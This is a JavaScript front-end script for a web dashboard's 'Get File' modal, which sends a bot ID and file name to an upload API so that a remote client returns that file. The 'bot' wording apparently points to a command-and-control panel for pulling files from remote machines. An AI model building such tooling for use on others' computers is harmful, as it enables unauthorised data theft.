// Dynamically load the "Get File" modal
async function loadUploadModal() {
    const response = await fetch('/static/html/partial.upload-modal.html'); // Fetch the modal HTML snippet
    if (response.ok) {
        const modalHtml = await response.text();
        document.getElementById('upload-modal-section').innerHTML = modalHtml; // Inject the modal into the DOM

        // Initialize modal-related JavaScript after loading
        initializeUploadModal();
    } else {
        showNotification('Failed to load upload modal', 'error');
    }
}

// Initialize the upload modal
function initializeUploadModal() {
    const modal = document.getElementById('upload-modal');
    const openModalButton = document.getElementById('open-upload-modal');
    const closeButton = modal.querySelector('.close-button');
    const uploadForm = document.getElementById('upload-form');
    const fileNameInput = document.getElementById('file-name-input');

    // Open the modal when the "Get File" button is clicked
    openModalButton.addEventListener('click', () => {
        modal.style.display = 'block';
    });

    // Close the modal when the close button is clicked
    closeButton.addEventListener('click', () => {
        modal.style.display = 'none';
    });

    // Close the modal when clicking outside of it
    window.addEventListener('click', (event) => {
        if (event.target === modal) {
            modal.style.display = 'none';
        }
    });

    // Handle the form submission
    uploadForm.addEventListener('submit', async (event) => {
        event.preventDefault();

        const botId = document.getElementById('client-id').value; // Hidden input for bot ID
        const fileName = fileNameInput.value.trim();

        if (!botId) {
            showNotification('Bot ID is missing.', 'error');
            return;
        }

        if (!fileName) {
            showNotification('Please enter a file name.', 'error');
            return;
        }

        try {
            const response = await fetch('/api/upload', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                body: `bot_id=${encodeURIComponent(botId)}&file_name=${encodeURIComponent(fileName)}`,
            });

            if (response.ok) {
                const result = await response.json();
                showNotification(`Upload request successfully sent to client.`, 'success');
            } else {
                const error = await response.json();
                showNotification(`Error: ${error.error}`, 'error');
            }
        } catch (error) {
            console.error('Error sending file request:', error);
            showNotification('Failed to send file request.', 'error');
        }

        // Close the modal
        modal.style.display = 'none';
    });
}

// Call the function to load the upload modal
loadUploadModal();